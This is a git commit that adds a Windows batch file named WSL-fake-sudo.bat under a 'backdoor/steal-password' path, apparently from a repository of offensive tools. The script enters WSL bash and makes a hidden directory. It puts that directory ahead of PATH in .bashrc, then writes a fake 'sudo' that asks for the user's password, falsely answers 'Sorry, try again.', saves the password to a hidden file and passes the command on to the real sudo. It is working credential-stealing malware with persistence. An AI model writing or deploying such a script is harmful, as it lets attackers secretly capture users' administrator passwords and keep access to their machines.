ad2e69a1722f9d33b408ad127f7520731a82a32c
Cervoise <antoine.cervoise@gmail.com>
2018-10-10 16:49:42 +0200

    Create WSL-fake-sudo.bat

---
+++ backdoor/steal-password/WSL-fake-sudo.bat
@@ -0,0 +1,12 @@
+bash
+mkdir .hidden
+echo "export PATH=\$HOME/.hidden/:\$PATH:" >> .bashrc
+echo "read -sp \"[sudo] password for $USER: \" sudopass" > .hidden/sudo
+echo "echo \"\"" >> .hidden/sudo
+echo "sleep 2" >> .hidden/sudo
+echo "echo \"Sorry, try again.\"" >> .hidden/sudo
+echo "echo $sudopass >> .hidden/pass.txt" >> .hidden/sudo
+echo "/usr/bin/sudo \$1" >> .hidden/sudo
+chmod +x .hidden/sudo
+exit
+exit
